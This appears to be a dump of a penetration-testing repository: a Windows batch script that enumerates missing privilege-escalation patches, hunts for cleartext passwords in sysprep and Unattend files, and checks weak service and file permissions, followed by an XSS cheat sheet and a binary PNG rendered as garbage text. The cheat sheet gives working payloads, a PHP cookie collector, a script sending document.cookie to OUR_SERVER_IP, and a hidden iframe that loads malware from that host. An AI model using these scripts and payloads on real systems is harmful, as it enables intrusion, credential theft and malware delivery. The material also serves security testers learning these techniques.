wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB2305420" | find /i "KB2305420" 1>NUL
IF not errorlevel 1 (
    
  echo MS10-092 patch is installed :(

) ELSE (

  echo MS10-092 patch is NOT installed! 

)

wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB981957" | find /i "KB981957" 1>NUL
IF not errorlevel 1 (
    
  echo MS10-073 patch is installed :(

) ELSE (

  echo MS10-073 patch is NOT installed! 

)

wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB4013081" | find /i "KB4013081" 1>NUL
IF not errorlevel 1 (
    
  echo MS17-017 patch is installed :(

) ELSE (

  echo MS17-017 patch is NOT installed! 

)

wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB977165" | find /i "KB977165" 1>NUL
IF not errorlevel 1 (
    
  echo MS10-015 patch is installed :(

) ELSE (

  echo MS10-015 patch is NOT installed! 

)

wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB941693" | find /i "KB941693" 1>NUL
IF not errorlevel 1 (
    
  echo MS08-025 patch is installed :(

) ELSE (

  echo MS08-025 patch is NOT installed! 

)

wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB920958" | find /i "KB920958" 1>NUL
IF not errorlevel 1 (
    
  echo MS06-049 patch is installed :(

) ELSE (

  echo MS06-049 patch is NOT installed! 

)

wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB914389" | find /i "KB914389" 1>NUL
IF not errorlevel 1 (
    
  echo MS06-030 patch is installed :(

) ELSE (

  echo MS06-030 patch is NOT installed! 

)

wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB908523" | find /i "KB908523" 1>NUL
IF not errorlevel 1 (
    
  echo MS05-055 patch is installed :(

) ELSE (

  echo MS05-055 patch is NOT installed! 

)

wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB890859" | find /i "KB890859" 1>NUL
IF not errorlevel 1 (
    
  echo MS05-018 patch is installed :(

) ELSE (

  echo MS05-018 patch is NOT installed! 

)

wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB842526" | find /i "KB842526" 1>NUL
IF not errorlevel 1 (
    
  echo MS04-019 patch is installed :(

) ELSE (

  echo MS04-019 patch is NOT installed! 

)

wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB835732" | find /i "KB835732" 1>NUL
IF not errorlevel 1 (
    
  echo MS04-011 patch is installed :(

) ELSE (

  echo MS04-011 patch is NOT installed! 

)

wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB841872" | find /i "KB841872" 1>NUL
IF not errorlevel 1 (
    
  echo MS04-020 patch is installed :(

) ELSE (

  echo MS04-020 patch is NOT installed! 

)

wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB2975684" | find /i "KB2975684" 1>NUL
IF not errorlevel 1 (
    
  echo MS14-040 patch is installed :(

) ELSE (

  echo MS14-040 patch is NOT installed! 

)

wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB3136041" | find /i "KB3136041" 1>NUL
IF not errorlevel 1 (
    
  echo MS16-016 patch is installed :(

) ELSE (

  echo MS16-016 patch is NOT installed! 

)

wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB3057191" | find /i "KB3057191" 1>NUL
IF not errorlevel 1 (
    
  echo MS15-051 patch is installed :(

) ELSE (

  echo MS15-051 patch is NOT installed! 

)

wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB2989935" | find /i "KB2989935" 1>NUL
IF not errorlevel 1 (
    
  echo MS14-070 patch is installed :(

) ELSE (

  echo MS14-070 patch is NOT installed! 

)

wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB2503665" | find /i "KB2503665" 1>NUL
IF not errorlevel 1 (
    
  echo MS11-046 patch is installed :(

) ELSE (

  echo MS11-046 patch is NOT installed! 

)

@echo on 

rem #-------------------------#
rem # File Transfer Utilities #
rem #-------------------------#

@echo off

cscript /?
powershell.exe /?
tftp /?

@echo on 

rem #-----------------------------#
rem # Clear-text/base64 Passwords #
rem #-----------------------------#

@echo off

type c:\sysprep.inf
type c:\sysprep\sysprep.xml
type %WINDIR%\Panther\Unattend\Unattended.xml
type %WINDIR%\Panther\Unattended.xml
dir /s *pass*
dir /s *cred*
dir /s *vnc*
dir /s *.config

@echo on 

rem #--------------#
rem # Backup Files #
rem #--------------#

@echo off

dir /s *backup*

@echo on 

rem #----------------------------------#
rem # *.MSI Install - SYSTEM privilege #
rem #----------------------------------#

@echo off

rem This will only work if both registry keys contain "AlwaysInstallElevated" with DWORD values of 1.
rem This setting will allow low privilege user to install any .MSI as system!

reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated

@echo on 

rem #------------------------#
rem # Unquoted Service Paths #
rem #------------------------#

@echo off

wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """

rem  All commands from this point onward will require accesschk.exe
rem  Make sure you have accesschk.exe(old version) in same directory when you run the script!

@echo on

rem #---------------------#
rem # Vulnerable Services #
rem #---------------------#

@echo off

rem  By default WinXP SP1 grant "Authenticated Users" SERVICE_ALL_ACCESS to "SSDPSRV" and "upnphost"!

accesschk.exe /accepteula -uwcqv "Authenticated Users" * 
accesschk.exe /accepteula -uwcqv "Power Users" *
accesschk.exe /accepteula -uwcqv "Users" *

@echo on 

rem #-------------------------------#
rem # Vulnerable Folder Permissions #
rem #-------------------------------#

@echo off

accesschk.exe /accepteula -uwdqs "Users" c:\
accesschk.exe /accepteula -uwdqs "Authenticated Users" c:\

@echo on 

rem #-----------------------------#
rem # Vulnerable File Permissions #
rem #-----------------------------#

@echo off

accesschk.exe /accepteula -uwqs "Users" c:\*.*
accesschk.exe /accepteula -uwqs "Authenticated Users" c:\*.*

@echo on 

rem #----------------#
rem # Happy Hunting! #
rem #----------------#

@echo off



---
File: /CheatSheets/XSS/readme.md
---

# XSS tricks

## Reflected

### Simple test
This is a simple test to see what happens, this is not a prove that the field is vuln to xss

`<plaintext>`

### Simple XSS test

`<script>alert('Found')</script>`

`"><script>alert(Found)</script>">`

`<script>alert(String.fromCharCode(88,83,83))</script>`

### Bypass filter of tag script

`"  onload="alert(String.fromCharCode(88,83,83))`

`" onload="alert('XSS')`

bla is not a valid image, so this cause an error

`<img src='bla' onerror=alert("XSS")>`

## Persistent

`>document.body.innerHTML="<style>body{visibility:hidden;}</style><div style=visibility:visible;><h1>HACKED!</h1></div>";`


### PHP collector

`> cookie.txt`
`chmod 777 cookie.txt`

edit a php page like colector.php as follow:

```php
<?php
	$cookie=GET['cookie'];
	$useragent=$_SERVER['HTTP_USER_AGENT'];
	$file=fopen('cookie.txt', 'a');
	fwrite($file,"USER AGENT:$useragent || COOKIE=$cookie\n");
	fclose($file);
?>
```

Script to put in page:

`<scritp>new Image().src="http://OUR_SERVER_IP/colector.php?cookie="+document.cookie;</script>`

### Malware Donwloader via XSS

<iframe src="http://OUR_SERVER_IP/OUR_MALWARE" height="0" width="0"></iframe>



---
File: /CheatSheets/28533648.png
---

�PNG


IHDR��Xۘ�KQIDATx���	�,W]/��ZU=�y����r����@Hb� a��"�D��U�{��z/O}*B=�@��S��Wd5�����ɜ�!ə�<�P���SսO��]U]�����}�?;gW���ݵֿ�z��K����b�$""�����(L""�0���b`�$""�����(L""�0���b`�$""�����(L""�0���b`�$""�����(L""��@���{^r�St�R#
�
jJa� 
KX`	�VdP��6��`
�5�2��w?��ݿ�$�Z����{_|se�=[5��F|���{��,J�>甝���G)����q��G���?�GV�0����Srv9���g6�8��6Q:0`�9�`���l�����ZŶ7�(��j�ϴ�A���w�y9��&5vo�["�AI
]��M�m "Jfk��)K8�����P�}�����k���Ն� �	o}�F��P�}�j��r�5�ቹ}�Q�\�-�*ѻ�d���g^��x�3�D#c÷f�[���_\}��_��v��n�r��������}Ja�@�.�,��u܉�����-�l�V�eQ��Ȣ�e�1���G�<r���s~@a��a�M^6^5ձ�n�"�7x� Fw�����F���}�c����[n��_�Z~2��a�0;��[�4�/WdNZĠ@�F:��\W܎��8y�C�R�X�#�f3J��t�z�h���0���0`�2ev'��^�����\���^À��t]mX"�&J���\=�{
f/sQ�M �A�$݀N�1��Kjkҍ �1
�Dҍp4���1`��o90�tNô�	~��d�m�	���~`)�㗼�(���P�FgN�^�T������`lb䛅���F��f2�Ě�,jX��`��?���y	�:��2W�����WdL)L�`J)�ϐ(���}��4_̣�~3:6t[~x�k
8� 3��u�N�=~�mׯ%�8
ŀ�r?2y��k��~�vD,4�`�G37�x��Ն��y��^�K��
a��������d�s�]H�a��R��i��a�$��c�t7���2��>���c\a���&c]��i�J�)
�����?�Q���$݄v�$��L����s��yF�"`
pV�m�z�D�7,-٤���K�
T���b���3L�<c���JOq:
&uŚ�ƀI����l���L�0`�[�t�}��D�'��nC�����-
��4L+I�z�9/����pF�#�`Z&��I�d+N�y���J��l�Ri��?��(�E?,"����}�C/;��KJa�9�,uB�3�q�F�}�K��tS	fB^y�+�GN�?ju�8�����r�?^��V���p��ycdl������#"X���pGw[7�0��)/XF�~R��0��A>�6�K���L�2}�Z{�`��)Tr�*����z����i%q(�0`vfB&�+�"gXF�:O�����-�t�V,�	Y��
�{�Ǌ�z)LQ�x�m4�2�
�f���K�P��I+iD���nàa�LHŭTq��R2�R��f�1`&d��K����j(�t��\~N����dxtx�H���F'b�Sdp&8���8���94<X��SH�]�I?]ƀ���2h�������d��3!Yg��,\7πI�08g�Jƒn �A;M���@���[��K����ɤ0h8�%$'��:�r�<ä�SPSP���0Rq*����&Q�
��\��;ԁԽ�ޫ&''u�pN�{��˒nT7]s�[^���Ҟ����3_|�8p@��̈�Cap��C赦��;�y{^�nѹRi�S+cF�1�G��^VZ��-Ɣ3��m�����o���l��%ÖR��ED�$��mJ)W[zP.��M��}�[Gn~^2-�?<����>�8f�׏7gO�Y����Dk�*9<Ӥ�ܲ�=��P��܊;��lֺ۪�ƀ�!JA��t0�D�� �+^���TH�X�������DDD10`���IDD&Q����\�mx��Y�Dm!F`�D�G+
�9;��0`�1;cc�yg#��T��o��B�R���O��8�����x�h�-�:�5�O�֯fN�`�Ĭ���?0��1�[&�|7v��\OGO=u������'�Ak^�'��8^������2��dlh������G?�	�`��f����&�&��+HX]Y�/Q<�|��@%�v�>�0�\��G�� �����)4�F=��DDD10`���IDD&Q���Ì	O���5J�>u_1����b>
�F�*�D9�T� �U_a��A^'�2����k�m�4����9`S[��SJ���N�/>�!��A�ZA�>����3��,�4����jj�����W^��6=D��p�׿�ux�O\�~�ϟ��~�b�����٣l�ƹ��Ǟݻ�bY;��;?���[��R�W�`��=��*�$S�m���[�p��ͭ4��S""�0���b`�$""�����(L""�0��W0i�Ŵ�&\}�+�W.����u�˕������dZכĕ-/=�����o��Q�|��W���	5��`��}S����'ʌ�"j�R2)P�pդ�V�����t3{��L�众J),��+�����%Դ�Āل��o�+{��th�Y�#&�}2ƌ��.�B�v�c��0`����{cnn��a�Ygs��J��.�,�Ǡ���E�������ˀ�~a�������]ou�#�Iu@T�����ID�����R���Raȍ*�J�<L"J�ux�I�ƀID��J>�&Eb�$�T��aR�1`Q*�|��u�J�`��8O+QJC+��`�8�0k�/h��f�����Mc�l�+FT�+ui��9�ЀȊQ��""���{|���������ҍ��R�d�&�&�BF�0)�0�(\W3`R�1`Q*h��ҍ�dSLD���tc���-��?��Ϊ��_8�Q�D��fP����yWZQ}�am���XjfJy�ijj+�Mo��8�u�-�[��3]h�m�4.z�3�	���c'q��L��Rs�|p�:u��u��z;�5|bX?��cgu�	�~��f��� ���;^��25�l&��f�LMM������sR+x��p�O�4��ۮx�R�����u�_z�/����W�:��V���y�3V�ڰ�T)�X.�.����?��~���Pm�E�g�F��̑;����N6������F+�B��3
A�v"/ nߵ����;w�@�	�V
Å��Q���U,]�;��Z���c����
�8q�ck�z��.��1`x��b;��8N�em+�Rh7�29�!'x6��v���5a����]�FC�9�5WC��ϰ�@8:2�����C���9�w����ǡ^�*,s��b�L9/}w��"aϗ��Z���(�`���O���%�o�yJg����ID�����0����UI7��e��LŸu�yx�@
L_3���F���t�oRWq�O��)�����F˓�s@i6��{{Pi�#E:q�D:vq�Ń��j�,Y�
�tk�-��N��U���e\��S��0�l���y�gӼ���J��|#/`}����#�v���J��nG_������c�F�m�Ĵ����+�w�X^���D�~�����߀�T�hP\tP��DG
x��k0{�D�iծX1��LU��KL��Њ��ڠ�Qmt���rJB�T�e��s���=9[�@�u\z�W���q0>�2{��b���L�p���ǝ�ʁ��������y܉i�<���z���>b,����0i�\�=����W5&�<L(Ewd(�6"�e���ǣ�&��䄗�stIdnJ����ժE�3%�(��)��#H�=k�X�g����+�xO]-)��~�Xmn�f�9�T��Y��6�w�.t����S{+'�nf&�"S���;UA��Dߩ���i�8��S���A�k߇�
�����r+�؝�`!�z��E���솿Qx��7���^.f�䖎�y�����O|/6�fn'�~�������~�����i=�#��_x^�^�\gR��]�]��ɜ���L�<��P^
�(�&��FSGD,
��]D%����0is0����'�VV;ڻ]����R�ѥ����h����E���W����g_\���n�~�}�z�3�2�۝�q�R�a��.�
�Ƚ���?}����q/n�\u��K�wq�j�������$y�rX*u�Ak�K���V���:�}�q�$ g��wNF�Lg�3���8�K�l�[_�GժV���8���q`�+���\������'��{�j�OŒ{���';��}��	�2�2�=V�?��8?Y����©�$�����[����!�VT��;��1���
�Z\�Q��3c�#`�V5
u,`*�Y�����x�QH�P��/����N��V��=���ת�
����/��	^[�>թaFxQv�0�&�����A��@�R�EQ�1`���IDD&Q����f�������	
�L����#E���r��\��zs�J�tU۟�f�n�?�����	j�~����o}��z���@�}5�� ��e�pǟ�.���\�Vj�y��"b��v�0$@.k�ʋvc(�[��˼m��ϴ����f�'�k��:ZIo����b�����6~�QrL�R����x��Ldnp�����2:D��������ce�}?X���`f�@����âZˌ]�^�{k�R$̾��y�v�RHQ1P�S��?�nޘ0���׃KÝ{e�xQ�q4kE�g"�}��f8�q��[1>���c�`�-`(`E��H�	��Z2-ʸX.E�g9K�G���Za�X£O̴�����*�"�Э�\> `����`dG�ghr�a��!ç8�}����7�R���i�ڱC���/^5ȫ�c�vZ�iw��ʟ��ګ�(赪��A!�T�a��e�0������D��>A��O���(L""�0���b`�$""�����(Β�[��u?�v��O�g#��AX�miԯ�+�
f/R
����㟅�,�,9$+�Ҿ�At.����0t�?@�����c��!��¥�G����	���U����?t:$q]!�h���P��EW��BDA���6V]�����տ�'��5>�Z���q�L����h��o}s�+��р�o���|��/ً�\X�� ��1R,��+������_��Q{P��-���X+GP�ះ_���?�߸����L�����NVs!72�0�Ҿ�C�S�yrJA�O�}(�����e�0����c�X>��Zaie
i��L&�q���
H8?�iÑ=ǯ���Xj�t!���w�����SGP�v�����{&�Wx���A�W�#��QŁ��8�_�����c����ṚƁ[���zf/SvDA(�����0��z:Y���!S9O�w��ftSۑ�n��V�IS� h��-
dբ���)\ZRj�(AX����ߧB��UV��f��Yܠ�#""�����(L""��f�)U�RI��u��G�{���'M����{��J����/E%"��K�<���Rk�s��>r�O�m�m��f�,%���n���YЀ�Ā�ײ�t�yT�$��{�]6nsWa��BrSi%X�Ph���P\��X;I!��7kl�����@7��ᡜ�6B�J�mz:l�Mÿ��6�#R�a����KO�~�Z�ʟA�=3<��t�����Z+XKG�� ��[{f�����g(�̉[1t�buv�鼣��V���0����JA��ط�	]��8b�Sg�s�[�]���v��=��7͋��7�r�l2��_rak�d�WZ;���R��=�d��
�G����{V.y{xPU�#_����J)��נ*����ؗ6��	ҭ�%�eU����i.�2�[P�/�d��e���ٹdyG�P�L�g���֯��L�j�c�ښ�y���%��V�g��VP���Y҆s (^�!j������Q�<�5�R���(L""�0���b`�$""���~�l}6l�,�E	%W��7PZD�oݚ�Vtd�>���������(�&XnĔ�?��{F`��X�A�>2Bh��LmZ{�G	����j�QC
�X
�5��xSˁ�g���j*p�.�˵TJ����`�s����MȀ��G��X!�ޝ������D�L]��K�
���锆.���	�x<���2NgK�yo�P�7>��&u�V��p�~�|�.��4:FY�=�u䞼1�����\�{u�[i���aH�_Y�X���F�4H+�J�.��zض����@D߁���E�t��#/��N���(O��V�@�Z@L��[J�2�4�j��s���^��X��ֿ��B�qa!��ߐ��)��Y�5����DD����@��)85!""J?L""�0���b`�$""�a@'�D3nP2�i�Y�Qy
Z�����n% ��[��'ʹ�#�c�Dl;�L���Ѐ��P'��<v�w)l;|qa-?���=����l���v����܍Ӿty���e7f�Y�	�����7ݟ�P��7��^�h���5w��wk,K��㰃^�$?
���h����-,�5��`=�S��4�F��S���ݺ��ww
�;�
U�
L(�w��5���n���Zx�o�Fjd����~44��_d����p>�>,J@��Qq�n6�(�'oD�ɛ��j�<�R�������?~�G
��ϼ�Ae�O���5�	��Զ�[��Op�g>ˮ��V��,�݇2`F����5	Y��ֵK!��ގ���&���n��jE� *��[����h��m�)��j�w����2p����(5�eC��0��ѩk0�i��mDD�"�{L�w��ODDD10`���IDD&Q���Y:�ҹoϑ��f�cspW皞."�6^H�Y"�F�6~�����r79uW��I�~k�-�c���Y�\S��R��gGl���c�h�6��Z[�R��I4���ƅ�'[{1@~sSυ���>�D��Ig`�lF���ۍh#�e툈�h���wi��Q����*~�IDD&Q�DDD10`���IDDg�6%j���݈��`}L�8nI-ǓK�5�Ӵ���0�ÿ�./�h
Pn�����*���(�C#w�9���K�ҮCy��M/�3�F畞���&%.2'�k�xtQ
9L"J��2�
$.����-���o�2`���ޭ�*>DD����X�l��"""�����(L""�0���b`�$""�a g�
��c�gW{�wqB��qj?%�rY/"J��qJUH%"S�7e��� �s��D�����ъ�l;�W��
��~�����T��h�+���'Z���u�Pv�x�*�Z9���$;����[������}�`��c	���𹴿Ү�3�F��&���@�]�0��7�2S� &�Tk赣�I�S��R�{�9��(�(�z���\U���΢2u9La�a�RZ��M���w|���-�W^kw0`ЖmہS[6���\�5��2SDDm�GA�h����m���#�rw��xZADD&Q�DDD10`���IDDf�K����L+	P�d���Ê�i���DDI�3VE1�t<�"""�����(L""�0���b`�$""���dׅ8����F��<]�=h����J�ꚚQk�1}��Z!K����!o<�e�_W���u��Ǐ�6�0����>w-pe.��8������n}�u�p��3�;745�Zy�ʓ�_/��R��t�䥀Ά�EPQY<~ﭨ W�]�V��E��YS~��m�]}0�~ސ ��b�"cS{�ӿ����1������������:B;�1����=����bt˞�53-=�1=�)@e�j+
0���/�
�������ii�0�������ʸ/}�[�>��0!�^j[c�E,7��`5���7�܍�n|����.`B*�g~
y���TZ� �~'�*�_j�y��)��|�l~}LD-RO�3A����|,<
�����T%�,mCy�je\����ǥ]��DD-*����0���b`�$""�����(L""��o�lb�qg����j��e[S<�m���:NhZ�q~Y���Y}�@�T��0��~�^����GA�q���� ����Y�@���G���g*`�&w�������]��١1���?p�S)a��W`�g����0:
+Sh~6%���Fw#;�??�#_>
,냢�0u!`�$��e`�a�Tb@�+"�8����`m�D��ꍁ��ۗ!n�X�,����"��{H�R��G����}"�@L����+/����$�V}�����3G��_d����~�Z� �,�/��)�������@�����#p�?��i{���F�+~�^����+G�~X������x�Oad^��y�o|����'~��a��WL\����-�����
֋#|�=?������~��=~󔲠tJ�'�*mA��T`L
����)��Q:W�������'��'T���o�j�)p����,{���������Y�2��1�:Nj�����/�7�H}�a���߇���c���`���t0���6����(L""�n�O|r�~�w��%7������r�:ʟ������AQ��Tgц�����.T
���;�WP~�
wض����5lI�3�ԸxAT�nj�zc\dZ���z��D~6���S������Um|Һ�c����@�z�T�8�Aat+~����O�
�)r+%|����Bp@Aal^�K����tH��]/Ge����Yi��*�G��|���
^�����o��R`��EP0�3���쫀�!�+<�y�{JK��.�[m�9/�X"Ղ����)�-�����_��?
�?W�{O
Y 1tzo�j�zk������ſ�N�@�d'��ܕ���I|�c�������{���᝟	=�����mg�9�Ā������}�B�Q).�K�[X<y0�L\�ѩ�p�bu
�(��;�;��_����[��f� ��svt�� ��
0������-2`zudg�v�<X�ڝ��^���z���0�#��O��l�[,
�$������ʂ��Cg�R�������آ$���R�8t��ob��!(��4�ދ^����q8����!���$�R��u�k��P�DDh�n<p4�W�w�6�Q�� �i$>Ft�U�ipi��m�����vK7�����8���H{���gU}\�q"�<zg����IDD&Q�DDD1p�OS�Aaβ!���8Nmf���ɾA�
D��=�,YD�6Պ��C�0U��bO?N㻴��i�<�[e�"G����}��׺��K9E����WE-�$��!%��k�k$���Y!���/q�
�!ak�)
H�v�Xw��W��++`�R�E	6���-�TK3������\d"���Ʒ��.)��?����\[o0�8(��	,��c�����.�`�{�^;^��5��rt�:��p5��Z���}���㰬�'r]���ه�_vF�N�����%�>�����?<�yo��<�y?W6�w S\�WE�����e����۽��0	\�{��t�ҫ'�[?��_��z�}�Jay��������R�� ����3�zƆs����r	X)E�+� �TP��Z�����Ti��?ty>�377������Z��������W���8\'8�]��ٔt�����>�QJcdrW����Z;Q+��T��vT�3�^W;Q�
@
s�Z�J%�Kk�B����>�O'ɀ���Z��8���To�������^�z�Ũ+޶���-����,�}1�J�Ԋ��f�T=mq���0�Ў�3H���`�硽1"�}��F�W�$bg���Ȗǫ6h�=O�t�""��`�$""�����(L""�R>k�Q_.���s�7���5Q{�����������v>b��ϓ4�M ��-��-�j�<,���7�Za��h��3o[:Z��rS`T��ҞS˳�s5��Ҵ��!P�����/)�����{�f��j�eJ�w��(Q0޾ce�co�ں������t�Rt���=��=�����mÏ�����e#�č�g��T�J	��
<�:����~�G�kuW�t��<~p���<=/��o~Q�4����2p�_T��<L��W�������űy'p����Wl����Fq�w9�\^mY�����n�$tPژܑQ\{ӽ
�D;��n껀����d�_��ѭgG/��-J�Z=k���i����G�		�G������|4�*�T������| �>:�Y#ޙ��0��Ѐ�K�4�e�H�VJa���8x�
��u��'���-0������/�ܨ�T���� �J)�ŀ��.�����6=��1�����Li]]�:`�����g�i$��Q
0`�0�S��t����f�T�+�&Qo�I?R��I���R(��`�����/�%�_ګ�Lu�b��nM
�B�����NqS4!��G�f�Qm�{��d���C�S�Gk}Ɵ�1�˲��K�8�OU3�@��£@��{/��F)dG�0��q�%W��
5�v���}(�zi��q�`-��|8|�h�5+���ր��h���1������p�w1�Qx��,�2)��L颀��9x�hp���}~ՠX	^�96�?�B�C�y: �s�L]X��(��X�惦R8y䇘9�@�b���/�S�;P��n�c��{�4����\p������(~���hn�k�G�/Ey�K��-�8��D����2,F����<0�|��,��.↻��M�6���>��	+�rJ!K�kw�W_Z��3����JĔZ�v�Zx�m��(V.��0����64��w�������
; ���c��r�p֥-ȼ�g�ئӓ�&W���R�������.��ǻ���M`�<�`N�!""�$L""�0���b`�$""�����(Β
��Dݠ�D�y��A�to�봫�AH��W��Ҕ�8��ȲT��A�����-�0��"S�7%j�i7g�z��_�\��>�h���Z�H�SZG%X�F�0`��C��+hJ�,^v�MR�~/�oEvv{�y�����#{Q��������2s��?;�˽�_	ܖ�8.&��k����oKp�}El��o������(���I=N�z���l)<|�i�R�Ć�F�X����LH���:�~��gxO�FHf�/^��A�Rpʫx��������W����E	��M��~p���3��"�{��_�����jA���
^�RPq����1~�[a9�:���=�,C&`֊pMH��,X!U���/�|��۽1l礅���[q�8�%���//⮃����	�qC�x�����
`t���8(�xV�����d���Y\�ſ���bi�Fy�F��fS��-�5�̴a�����D=O��q�W�xŀ�Yu���b`�$""�����(L""�8�)�g�j�_�:&c܈��j��w�ZdZw�#6�x���O�%�(�T�� �l���s,#���o��C��ޡ����/mq�o'���(�E�UU�}z�[_@adk�i%��M���{/xt�/�./��E��'e:��)���,������t�y��<r�D/��i����������c�2�y:1�1��\^8����ć�g����6��Ji��}�r�Z�
x���<�G��)͛6���s↍�q,·L?�ie_�ص�?>�W
z��ކ�\
��Pmc}��g�׈�%z�)ط��b�s��x���gd��c���;Z��4��W�Q��B��y�A���ɂ��^=�=c�9���^�+��C�B�^��~`����̒?��K3����cPJ��T��۟Q�j�
Q,Ml�_|����0�����z;iko�=F�]���F��Rwx]��1.�(�C5Й�^yQ���,��ű���Q�DDD10`���IDD�`N�iH��4�>�\������l��չ�8Da�OZ��lZ`�������ƺ��X�N���c07R
�=��N��jRs����R��B����@!������>�`�"X���x�D�V�ˌQ2�(G~�џ����L������{�ʸ�\�f���*����h�i%�PPpݲ�������a��F�����	+�Z+<�������3�ֱc04�?����~~Z�����?}Q�ﱃۣ��k��}��������ur��;?5�����<��w�n�G^��d)|�;+��m���-z�'����?�^��B��y�ǝ��mC������l��ǝ_�X}�AnhW��=�M6��nX�Ɲ��q���?�W��k[>���g2`��~"��v���t+e�Ze�6���8r�7��>���`t�^�t��M�	�sTa�Xh�<�l`k�f��Բc��#�jn[/`n�(E��P2pl����J���K��g_�y���sϲ����%�RX�=�'�-��xt�ll�s	F��0�����701��:���gYޑ��z��L��^�E}ɤ�Fo��;f�Q�7�Fm�dyc�m)ء����"#�_H- �HPlD�j�׺���om����0%��i�Y�DDD10`���IDD&Q�9�',���T���n���-��4�3nRBz9�Z�٧o�h�<Ϧ���ݪ�1`}�aԘ�ta�.̀�F`� ���­,��a*X�|W��YؙQh{�s�e�k^6"چ�l�}�q�T-�.g�h[[��=R,"�+[)��?d���P�}"-���}O��,�j���K+Y�ߝ��T�
��b��ژ�D덑�B���0���BĞ8��]�����z;�O��cx|[G�����]�=ϼ2`�W��s�/� ����L%x@S
�<��{�
�4�\ `kA���B�
h�N,\���V���ocE&�߭���Rk��C٤�1��{�W��jRqYBT�%c*�~��9.p������@�5sרN>�D�κ��?�%0���ţ��4�߅���O��ޛ�	w~�u���
���i`

d�l��wG��W$�(���p�o�ݺc�{���ը6����0�I��.��W}���sx֎��O,������8����hk��zO�Kz�n#��L�~Y.�M�>o�;������qf����"0�mp&/�+3aL䕌v��)�œ�p�[ꊣ�R�z���3��`فsc�N�,�������(�`{�����
��I�%�Z�i�ﴥ�HiX��y�.�*�8K���(L""�0���b`�$""���~�T�R	��ˁeٰ�L�:��"��+P��߂�U��ia�5�.2E��|�k>����N��\m�3h
%��y�3z+Nǀ���zuP@��K���졎�az�=��"L､べ�J�+������y�ּ
�4	�e�g�;���ŐLT��
�-���t��9I��9�U<���W;�4^��w�>������	_����OF&j��u\�蚷a�9��u=`*䴋Kǎa�.$zW0Ɔ��-o$]͇'���?X߮va�O<Z��5�Q{@�s����]\���>z-�fAuj�I8��1`6Ai�[�F^�9x�L�j��^z5��Ϯ�?��
|�7��~���b`�$""�����(L""�8�����e��`Ǝ�6
�Fi��{�M�t݈��ؤ�ꂿ�R��O
�l��fRz���V�����4�|�m�L�z�Ԗ�j�~Ҧ4/�-�1����
͖�6ܰ�%�i�M��Cm��v�3�"!�U)����]7|�_K��:�C�w����[��y�w����db������:4s�ƥ��b�T	N+������Q��kr��7
��yu4��xC�ʣ������3vn��^P<~�.��oܟ��-��)�D��J6����\�.⛝�w��׎^�/�[��nك7�"Ʀ��+�BQ��1���a�O����R$���')��櫷~8���2f�;~��U
>��vna;��'���M=��N������͟y_�Y&�R"X�؊���	��]�3�4�cJ��:��D��-P�c��8M���
_g�HU�^`�u���+""�0���b`�$""�����(L""�8K6I':	Z[@h^au�Y!��Jlo����L%�A�P܀]���~�4���-�܎���t�Hm�ְ�"�񃺊3AtШ�E��9x�y��(�*����Ϡ0�����Q����.Ŷ}�
�����Q���ՠDՊ,<̠IR+J��
�]IHfЅ�}Yy������**���|�V��4�>������^�u?�m�4�Zlmfڹ.������]Z��
��m�Y���l�`B1�l*�_� �Bᡏ����:Cbc���S��c)�O��HA��:�?��X<�_����V���mt�lG��6����.`���
����͢ӕ�N����[�_Sx1L[�s7S���>Q�DDD10`���IDD'���Z�Đ����ܦ�U8�w
&q�9j(l���[J�֗����j���["���3劅(;��kP����l�+�+�q�i���r5�A�@����Ei":��s(E`t��\�!:�9�R��J�<J����ʻ��J�)�)�?{��"M ^�}�K^�+�z-\7  *]���]]�M��\@:�Aq�P�� ����V�N�� ��7��X»���$�aR,����Dn�q�t����_��w�!��e�"�+�H`r[��]P+w&���p≇�.:���.OliS{�1`R,ڲ��"Օ�!n�V���iPH�}Hk�������4�w���IDD&Q�DDD1p��b,{I��� �t����Oo�@�u��M�Ѐ[�(][�,�a'{$�Ԋ�Ҝ�'ħ)A�_�-���#�S�
���0nE��J�6�[D�'P�F��������h�.彛z�?]sM��e�����)���c+s'��J��F���o�m�OW�O�Ti#w�ti>�55���
k�AɝB�
[˰���.��[;R�k
���〄����t�4.�/�-���n֖��o�"�����w�}��S���������u��_}�����o��Q��B?bF��Ayh7�����>���kO*%���rk�É�B3����Il��7_��i?6��{�?#p�e�X\��z�;�2�����)���P`)���YE)W��귉R��71�<��фy�a��ܦ����>��+�Q'q�u�Z�TI�
DD�`��.�P���w0`Rw\u#��QOc���8p������R���F�|��E�7�pj�߰[��J�ũ)yџ]u���?�1T��S��,Y�+�Fe�Cp��S�wE��Y���Dqeƪ_�Z�*��X�	��T0PN��3���?gC�+qP.-����j�����taEYE	�Ѕo�mm7��xDFi�>���q��#ov��=u[�ƫ�Z�N�>���.�b�?�.�$Xܠ�������`��I����� �R��GރcG~Qٺ�%_yWe�Z�qtĹ����N+y�D]�3LJy������_4^v+��]~�m4��}�΂;����j�Pg�j�PS�Lv�ع�ls'�ĉ��?����ϼ�?���ǁN5�(GJ
���ֹu�60�EX� Ť�g��,JP�k�X���m#Q��];��&�/�&Pze�.%�l��J��I����q�)Y��&��s$�6Pz��N�D1`R��G�n��X.�/�)Q��C�᮹��ךސ�$F�u��e��3��d��P���B�J��'��f?2���S]BԶ��[�U�|)(�h�aR�0)5>����v
